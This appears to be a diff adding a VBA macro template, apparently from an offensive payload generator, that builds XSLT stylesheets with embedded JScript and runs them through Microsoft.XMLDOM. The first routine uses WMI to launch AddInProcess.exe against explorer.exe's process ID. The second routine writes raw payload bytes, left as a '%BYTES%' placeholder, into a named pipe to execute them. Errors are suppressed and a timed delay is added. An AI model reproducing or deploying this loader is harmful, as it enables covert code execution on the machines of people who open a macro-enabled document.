@@ -1,0 +1,99 @@
+Dim XSLT
+Dim XSLT1
+
+Sub Analysis()
+On Error Resume Next
+    XSLT1 = ""
+    XSLT1 = XSLT1 + "<?xml version='1.0'?>" & vbNewLine
+    XSLT1 = XSLT1 + "<stylesheet" & vbNewLine
+    XSLT1 = XSLT1 + "xmlns=""http://www.w3.org/1999/XSL/Transform""" & vbNewLine
+    XSLT1 = XSLT1 + "xmlns:ms=""urn:schemas-microsoft-com:xslt""" & vbNewLine
+    XSLT1 = XSLT1 + "xmlns:user=""placeholder""" & vbNewLine
+    XSLT1 = XSLT1 + "version=""1.0"">" & vbNewLine
+    XSLT1 = XSLT1 + "<output method=""text""/>" & vbNewLine
+    XSLT1 = XSLT1 + "    <ms:script implements-prefix=""user"" language=""JScript"">" & vbNewLine
+    XSLT1 = XSLT1 + "        <![CDATA[" & vbNewLine
+    XSLT1 = XSLT1 + "function getProc(procName)" & vbNewLine
+    XSLT1 = XSLT1 + "{" & vbNewLine
+    XSLT1 = XSLT1 + "var loc = new ActiveXObject(""WbemScripting.SWbemLocator"");" & vbNewLine
+    XSLT1 = XSLT1 + "var svc = loc.ConnectServer(""."", ""root\\cimv2"");" & vbNewLine
+    XSLT1 = XSLT1 + "coll = svc.ExecQuery(""select * from Win32_Process"");" & vbNewLine
+    XSLT1 = XSLT1 + "var e = new Enumerator(coll);" & vbNewLine
+    XSLT1 = XSLT1 + "for (; !e.atEnd(); e.moveNext()) {" & vbNewLine
+    XSLT1 = XSLT1 + "var p = e.item ();" & vbNewLine
+    XSLT1 = XSLT1 + "curproc = p.Name.toLowerCase();" & vbNewLine
+    XSLT1 = XSLT1 + "if (curproc == procName) {" & vbNewLine
+    XSLT1 = XSLT1 + "return p.ProcessId;" & vbNewLine
+    XSLT1 = XSLT1 + "}" & vbNewLine
+    XSLT1 = XSLT1 + "}" & vbNewLine
+    XSLT1 = XSLT1 + "return 0;" & vbNewLine
+    XSLT1 = XSLT1 + "}" & vbNewLine
+    XSLT1 = XSLT1 + "var intProcessID = getProc(""explorer.exe"");" & vbNewLine
+    XSLT1 = XSLT1 + "            var locator = new ActiveXObject(""WbemScripting.SWbemLocator"");" & vbNewLine
+    XSLT1 = XSLT1 + "            var service = locator.ConnectServer();" & vbNewLine
+    XSLT1 = XSLT1 + "            service.Security_.ImpersonationLevel = 3;" & vbNewLine
+    XSLT1 = XSLT1 + "            var startup = service.Get(""Win32_ProcessStartup"");" & vbNewLine
+    XSLT1 = XSLT1 + "            var instance = startup.SpawnInstance_();" & vbNewLine
+    XSLT1 = XSLT1 + "            instance.ShowWindow = 12;" & vbNewLine
+    XSLT1 = XSLT1 + "            var pid;" & vbNewLine
+    XSLT1 = XSLT1 + "            var process = service.Get(""Win32_Process"");" & vbNewLine
+    XSLT1 = XSLT1 + "            var cmdline = ""C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\AddInProcess.exe /guid:32a91b0f-30cd-4c75-be79-ccbd6345de99 /pid:""+intProcessID;" & vbNewLine
+    XSLT1 = XSLT1 + "            var error = process.Create(cmdline, null, instance, pid);" & vbNewLine
+    XSLT1 = XSLT1 + "var ct = 0;" & vbNewLine
+    XSLT1 = XSLT1 + "while(ct < 100000)" & vbNewLine
+    XSLT1 = XSLT1 + "{" & vbNewLine
+    XSLT1 = XSLT1 + "ct++;" & vbNewLine
+    XSLT1 = XSLT1 + "}" & vbNewLine
+    XSLT1 = XSLT1 + "        ]]>" & vbNewLine
+    XSLT1 = XSLT1 + "   </ms:script>" & vbNewLine
+    XSLT1 = XSLT1 + "</stylesheet>" & vbNewLine
+    Set XML = CreateObject("Microsoft.XMLDOM.1.0")
+    XML.async = False
+    XML.LoadXML XSLT1
+    XML.transformNode XML
+    
+End Sub
+
+Sub part0()
+On Error Resume Next
+XSLT = ""
+XSLT = XSLT + "<?xml version='1.0'?>" & vbNewLine
+XSLT = XSLT + "<stylesheet" & vbNewLine
+XSLT = XSLT + "xmlns=""http://www.w3.org/1999/XSL/Transform""" & vbNewLine
+XSLT = XSLT + "xmlns:ms=""urn:schemas-microsoft-com:xslt""" & vbNewLine
+XSLT = XSLT + "xmlns:user=""placeholder""" & vbNewLine
+XSLT = XSLT + "version=""1.0"">" & vbNewLine
+XSLT = XSLT + "<output method=""text""/>" & vbNewLine
+XSLT = XSLT + "    <ms:script implements-prefix=""user"" language=""JScript"">" & vbNewLine
+XSLT = XSLT + "        <![CDATA[" & vbNewLine
+%BYTES%
+
+
+On Error Resume Next
+    XSLT = XSLT + "try {" & vbNewLine
+    XSLT = XSLT + "var f = new ActiveXObject(""Scripting.FileSystemObject"");" & vbNewLine
+    XSLT = XSLT + "var t = f.CreateTextFile(""\\\\.\\pipe\\32a91b0f-30cd-4c75-be79-ccbd6345de99"", true, false);" & vbNewLine
+    XSLT = XSLT + "for(x in rawData) {" & vbNewLine
+    XSLT = XSLT + "   t.Write(String.fromCharCode(rawData[x]));" & vbNewLine
+    XSLT = XSLT + "}" & vbNewLine
+    XSLT = XSLT + "t.Close();" & vbNewLine
+    XSLT = XSLT + "} catch(e) {" & vbNewLine
+    XSLT = XSLT + "}" & vbNewLine
+    XSLT = XSLT + "        ]]>" & vbNewLine
+    XSLT = XSLT + "   </ms:script>" & vbNewLine
+    XSLT = XSLT + "</stylesheet>" & vbNewLine
+    
+    Set XML = CreateObject("Microsoft.XMLDOM.1.0")
+    XML.async = False
+    XML.LoadXML XSLT
+    XML.transformNode XML
+End Sub
+Sub Main()
+    Analysis
+    Application.Wait (Now + TimeValue("0:00:10"))
+    part0
+End Sub
+ 
+
+
+
